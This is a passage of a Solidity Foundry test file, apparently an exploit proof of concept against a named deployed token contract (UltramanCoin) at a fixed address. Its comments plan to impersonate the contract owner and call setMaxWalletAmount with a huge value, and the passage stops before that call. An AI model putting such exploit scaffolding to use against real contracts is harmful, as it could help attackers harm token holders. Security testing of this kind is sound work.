    function maxWalletAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x733f8B3545a810214D2D27EEC8c60f93b561C050;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner
        address owner = UltramanCoin_0x733f8B3545a810214D2D27EEC8c60f93b561C050(TARGET).owner();

        // Impersonate the owner and call setMaxWalletAmount with a huge value
